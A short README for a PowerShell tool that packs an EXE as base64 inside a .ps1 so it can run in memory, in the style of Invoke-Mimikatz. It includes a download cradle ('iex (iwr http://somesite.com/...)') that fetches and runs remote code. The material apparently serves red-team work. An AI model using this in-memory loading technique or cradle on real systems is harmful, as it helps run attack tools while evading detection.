# Exe-ToInvokeScript.ps1
This Powershell script will take an EXE and compress and base-64 encode it within a .ps1 file, allowing it to be extracted and executed directly in-memory, based on the technique used for Invoke-Mimikatz, Invoke-Rubeus, etc.

# Use
Create a Powershell-invoked version of an EXE:

```
./Exe-ToInvokeScript.ps1 -InFile <file.exe> -OutFile <outfile.ps1>
```

Loading the script via the web

```
iex (iwr http://somesite.com/Invoke-MyScriptName.ps1 -usebasicparsing)
```

Run the executable 

```
Invoke-MyScriptName -Arguments '<exe arguments>'
```

# Limitations
Note: Some EXEs will run better than others using this technique. The most suitable EXEs are ones which run via commandline arguments. Although the EXEs should run from memory, nothing will prevent them from writing artifacts to disk if this is what they normally do.
